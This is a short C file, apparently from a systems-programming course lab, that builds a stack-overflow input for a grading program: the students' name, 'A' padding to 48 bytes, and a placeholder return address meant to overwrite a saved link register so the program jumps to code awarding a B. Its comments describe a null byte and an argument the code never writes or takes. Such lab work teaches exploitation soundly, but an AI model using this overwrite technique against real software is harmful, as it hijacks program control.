/*--------------------------------------------------------------------*/
/* File: createdataB.c                                                */
/*                                                                    */
/* Function: Produces a file called dataB with the student name,      */
/* a nullbyte, padding to overrun the stack, and the address          */
/* of the instruction in main to get a B, the latter of which will    */
/* overwrite getName's stored x30.                                    */
/*                                                                    */
/* Names: Alex Delistathis, Matthew Zhang                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
/* Accepts a string of characters as a command-line argument. Writes
   the string of characters to the dataB file. Returns 0. */
int main(void) {
   unsigned int uiData;
   FILE *dataB;
   
   dataB = fopen("dataB", "w+");
   
   if (dataB == NULL) {
        perror("Error opening file");
        return -1;
   }

    const char name[] = "Alex Delisthathis & Matthew Zhang";
    fwrite(name, sizeof(char), strlen(name), dataB);

    /* Adjust the size as needed with 48 byte buffer*/
    const int paddingSize = 48 - strlen(name); 
    for (int i = 0; i < paddingSize; i++) {
        fputc('A', dataB); /* Writing padding character 'A'*/
    }

    /*Address to overwrite return address with in little-endian format*/
    unsigned int address = 0x4196500; /*Replace with the correct address*/
    fwrite(&address, sizeof(unsigned int), 1, dataB);
    fclose(dataB);
    return 0;
}
